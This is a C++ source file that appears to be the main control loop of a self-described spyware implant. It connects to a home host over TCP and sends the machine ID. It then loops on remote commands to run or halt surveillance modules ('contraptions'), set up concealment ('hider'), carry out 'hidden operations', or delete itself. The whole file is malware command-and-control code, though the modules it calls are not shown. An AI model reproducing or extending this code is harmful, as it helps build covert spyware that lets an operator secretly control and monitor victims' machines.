#include <iostream>

#include "../Maneger/Connection.h"
#include "../Maneger/SocketConnection.h"

#include "../IncludeCPP/Status.h"

#include "../Maneger/HiderManeger.h"
#include "../Hider/HiderCodes.h"
#include "../Maneger/Listener.h"
#include "../Maneger/Connection.h"
#include "contrapMeta.h"
#include "Contraption.h"
#include "ContraptionAdmin.h"
#include "../IncludeCPP/getBasicInfo.h"

int initRun(std::shared_ptr<Connection> conn);


#define PORT (65410)

#define DEBUG

void loopIter(std::shared_ptr<SocketConnection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin);


int main() {
    
    std::cerr << "started spyware" << std::endl;
    
    HiderManeger& hiderManeger = HiderManeger::getInstance();
    ContraptionAdmin admin;
    std::shared_ptr<SocketConnection> conn;
    
    sleep(2); // wait for python to start

    if (SocketConnection::connectTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
        exit(EXIT_FAILURE);
    }
    bool cont = true;
    while (cont)
    {
        loopIter(conn, hiderManeger, admin);
        std::cerr << "spyware: compleated loop iter\n";
    }

    return EXIT_SUCCESS;
}


// perform stuff after connection to home creation
// meant for sending information required for operation
int initRun(std::shared_ptr<Connection> conn) {


    if (conn->sendString(getMachineID(), true) == false) {
        std::cerr << "error sending machine id" << std::endl;
        exit(EXIT_FAILURE);
    }

    return 0;
}


void loopIter(std::shared_ptr<SocketConnection> conn, HiderManeger& hiderManeger, ContraptionAdmin& admin)
{
    command cmd;

    conn->recvData(sizeof(cmd), (char*)&cmd);

    Status stat = DID_NOTHING;
    std::string strRes = "";

    switch (cmd.fncode)
    {
    case RunContraption:
        stat = admin.runContraption(conn, cmd.identifier);
        break;

    case HaltContraption:
        stat = admin.haltContraption(cmd.identifier);
        break;

    case SUICIDE:
        conn->sendResponceStruct((responce){.dataLen = 0, .status = SUICIDE_SUCSESS});
        std::exit(EXIT_SUCCESS);
    
    case HIDER_SETUP:
        std::cerr << "start  hider setup\n";
        stat = hiderManeger.setUpHider(cmd.strParam);
        std::cerr << "finnsh  hider setup\n";
        break;
    }

    if (cmd.fncode & HIDDEN_OPRATION && cmd.fncode < (HIDDEN_OPRATION << 1)) {
        stat = hiderManeger.hiddenAction(cmd, conn);
    }

    conn->flushInput();
    std::cerr << "Spyware:  Conn: res-" << stat << "\nresponse-" << strRes << std::endl;
    conn->sendResponce(stat, strRes);
    std::cerr << "Spyware: responce sent" << std::endl;
}
